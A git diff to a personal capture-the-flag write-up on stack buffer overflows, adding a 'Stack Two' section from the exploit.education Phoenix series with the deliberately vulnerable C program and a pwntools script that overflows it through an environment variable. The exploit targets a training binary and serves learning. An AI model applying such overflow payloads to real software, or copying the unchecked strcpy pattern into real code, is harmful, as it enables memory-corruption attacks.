@@ -1,6 +1,6 @@
 # Buffer Overflow
 
-In C, a buffer is an area of memory set aside for the temporary storage of data. A buffer overflow is when an input to a buffer exceeds the original intended buffer area, overwriting other program information, thus making the program behave unexpectedly. In CTFs, I have seen two main types of overflows: overflowing the buffer, and overflowing the buffer and writing an address for the system to return to. I will be using the https://exploit.education/phoenix/ Stack series to show how to overflow the buffers. I will also use this as an opportunity for myself to learn how to properly use `pwntools` as well.
+In C, a buffer is an area of memory set aside for the temporary storage of data. A buffer overflow is when an input to a buffer exceeds the original intended buffer area, overwriting other program information, thus making the program behave unexpectedly. In CTFs, I have seen two main types of overflows: overflowing the buffer, and overflowing the buffer and writing an address for the system to return to. I will be using the https://exploit.education/phoenix/ Stack series to learn how to do buffer overflows. This is just my write-ups for me to come back later on, if needed. I will also use this as an opportunity for myself to learn how to properly use `pwntools` as well.
 
 ## Stack Zero
 
@@ -135,6 +135,58 @@ payload = flat({
     64: p32(0x496c5962) #No need for quotes here; It basically cyclic fills until 64
 })
 p = process(["./a.out", payload])
+p.interactive()
+```
+
+## Stack Two
+
+```
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int changeme;
+  } locals;
+
+  char *ptr;
+
+  ptr = getenv("ExploitEducation");
+  if (ptr == NULL) {
+    errx(1, "please set the ExploitEducation environment variable");
+  }
+
+  locals.changeme = 0;
+  strcpy(locals.buffer, ptr);
+
+  if (locals.changeme == 0x0d0a090a) {
+    puts("Well done, you have successfully set changeme to the correct value");
+  } else {
+    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
+        locals.changeme);
+  }
+
+  exit(0);
+}
+```
+
+After compiling this code, I got an error: `a.out: please set the ExploitEducation environment variable`. This was fixed by running: `export ExploitEducation=1`. I spent a while trying to find out why my input was not changing the buffer, until I realized the input was meant to pass through the environment variable.
+
+I was not aware of how to submit a environment variable using pwntools. I was able to learn from [this writeup](https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-two/exploit.py#L21). From there I learned to pass a variable through the process module. My solution to this ended up being:
+
+```
+from pwn import *
+import subprocess
+elf = ELF("./a.out", checksec=True)
+context(endian="little", log_level="debug")
+payload = flat({
+    64: p32(0x0d0a090a) #No need for quotes here; It basically cyclic fills until 64
+})
+p = process(["./a.out"], env={"ExploitEducation" : payload })
 p.interactive()
 ```
 
